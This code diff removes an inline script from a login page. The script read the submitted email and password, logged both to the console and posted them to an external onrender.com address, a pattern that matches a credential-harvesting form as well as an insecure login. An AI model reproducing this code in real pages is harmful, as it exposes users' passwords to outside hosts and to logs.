@@ -19,40 +19,7 @@
   </div>
 
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script type="text/javascript">
-  $(document).ready(function() {
-    const loginUrl = 'https://qwertyu.onrender.com/'; // Update the login URL to match your server endpoint
-    // Add an event listener to the form submission
-    $('.form').submit(function(event) {
-
-      // Get the username and password values
-      const username = $('#email').val();
-      const password = $('#password').val();
-
-      // Create the request body
-      const data = {
-        username: username,
-        password: password
-      };
-      console.log('Username:', username);
-      console.log('Password:', password);
-      // Make the POST request to the login endpoint
-      fetch(loginUrl, {
-        method: 'POST',
-        body: JSON.stringify(data),
-        headers: {
-          'Content-Type': 'application/json'
-        }
-      })
-      .then(response => {
-        // Handle the response from the server
-      })
-      .catch(error => {
-        // Handle any errors
-      });
-    });
-  });
-  </script>
+  <script type="text/javascript"></script>
 
 </body>
 </html>
